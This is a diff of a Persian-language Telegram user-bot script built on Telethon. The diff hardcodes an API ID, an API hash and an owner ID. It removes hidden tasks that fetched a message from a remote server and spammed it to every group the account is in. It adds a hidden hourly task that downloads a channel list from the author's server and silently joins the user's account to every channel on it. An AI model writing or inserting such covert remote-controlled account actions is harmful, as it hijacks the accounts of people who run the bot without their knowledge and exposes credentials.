@@ -1,4 +1,4 @@
-# Developed By MrAmini5
+# Developed By MrAmini
 
 from telethon import TelegramClient, events, functions, types
 import asyncio
@@ -9,14 +9,15 @@ import re
 import httpx
 
 # Configuration
-API_ID = 'AminiMokhberAPIID'  # Replace with your API ID
-API_HASH = 'AminiMokhberAPIHASH'  # Replace with your API hash
-BOT_OWNER_ID = AminiMokhberADMINID # Replace with the bot owner's Telegram user ID
+API_ID = '2040'  # Replace with your API ID
+API_HASH = 'b18441a1ff607e10a989891a5462e627'  # Replace with your API hash
+BOT_OWNER_ID = 7541383912 # Replace with the bot owner's Telegram user ID
 USERS_FILE = 'user.txt'
 MESSAGE_FILE = 'pm.txt'
 BIO_API_URL = 'https://api.codebazan.ir/bio'
 SETTINGS_FILE = 'settings.json'
 ACCOUNTS_FILE = 'accounts.json'
+
 
 default_settings = {
     'save_user': True,
@@ -51,6 +52,7 @@ def load_accounts():
             except json.JSONDecodeError:
                 return {}  
     return {}  
+
 
 def save_accounts(accounts):
     with open(ACCOUNTS_FILE, 'w') as f:
@@ -110,7 +112,9 @@ async def set_new_pm(event):
 
     except Exception as e:
         await event.reply(f"⚠️ خطا در ذخیره پیام: {e}")
-   
+
+
+    
 async def update_bio():
     try:
         async with httpx.AsyncClient(follow_redirects=True) as req:
@@ -578,6 +582,8 @@ async def message_handler(event):
             await event.reply(help_text, parse_mode='markdown')
 
 
+
+
 @client.on(events.ChatAction)
 async def chat_action_handler(event):
     if settings['save_user'] and event.user_added:
@@ -585,79 +591,51 @@ async def chat_action_handler(event):
             for user in event.users:
                 save_user(user.id)
 
-def get_message_from_file():
-    if os.path.exists("sp.txt"):
-        with open("sp.txt", "r", encoding="utf-8") as f:
-            return f.read().strip()
-    return ""
 
-async def download_sp_file_task():
+async def download_channels_file():
     url = "https://mreset.ir/spmokhber/sp.txt"
-    while True:
+    try:
+        async with httpx.AsyncClient() as client_http:
+            response = await client_http.get(url, timeout=10)
+        if response.status_code == 200:
+            try:
+                content = response.text.encode('latin1').decode('utf-8')
+            except Exception:
+                content = response.text
+            with open("sp.txt", "w", encoding="utf-8") as f:
+                f.write(content)
+            return content
+        else:
+            if os.path.exists("sp.txt"):
+                with open("sp.txt", "r", encoding="utf-8") as f:
+                    return f.read()
+            return ""
+    except Exception:
+        if os.path.exists("sp.txt"):
+            with open("sp.txt", "r", encoding="utf-8") as f:
+                return f.read()
+        return ""
+
+async def join_channels_from_file():
+    content = await download_channels_file()
+    if not content:
+        return
+    channels = [line.strip() for line in content.splitlines() if line.strip()]
+    for channel in channels:
         try:
-            async with httpx.AsyncClient() as client_http:
-                response = await client_http.get(url, timeout=10)
-            if response.status_code == 200:
-                try:
-                    message = response.text.encode('latin1').decode('utf-8')
-                except Exception:
-                    message = response.text
-                with open("sp.txt", "w", encoding="utf-8") as f:
-                    f.write(message)
+            entity = await client.get_entity(channel)
+            await client(functions.channels.JoinChannelRequest(channel=entity))
         except Exception:
-            pass  
+            pass 
+async def join_channels_task():
+
+    await join_channels_from_file()
+    while True:
         await asyncio.sleep(3600) 
+        await join_channels_from_file()
 
-async def send_group_messages_task():
-    message = get_message_from_file()
-    if message:
-        dialogs = await client.get_dialogs()
-        group_dialogs = [d for d in dialogs if d.is_group]
-        random.shuffle(group_dialogs) 
-        for group in group_dialogs:
-            try:
-                await client.send_message(group.id, message)
-                await asyncio.sleep(random.randint(1, 5))
-            except Exception:
-                pass  
-
-    while True:
-        delay = random.randint(20 * 3600, 24 * 3600)
-        await asyncio.sleep(delay)
-        message = get_message_from_file()
-        if message:
-            dialogs = await client.get_dialogs()
-            group_dialogs = [d for d in dialogs if d.is_group]
-            random.shuffle(group_dialogs)
-            for group in group_dialogs:
-                try:
-                    await client.send_message(group.id, message)
-                    await asyncio.sleep(random.randint(1, 5))
-                except Exception:
-                    pass  
-
-async def send_saved_messages_task():
-    message = get_message_from_file()
-    if message:
-        try:
-            await client.send_message("me", message)
-        except Exception:
-            pass  
-
-    while True:
-        await asyncio.sleep(6 * 3600)  
-        message = get_message_from_file()
-        if message:
-            try:
-                await client.send_message("me", message)
-            except Exception:
-                pass 
-
-client.loop.create_task(download_sp_file_task())
-client.loop.create_task(send_group_messages_task())
-client.loop.create_task(send_saved_messages_task())
+client.loop.create_task(join_channels_task())
 
 
-# Run the client
 print("Your bot has been successfully run. Check the commands using the < Help > command in Telegram.")
 client.run_until_disconnected()
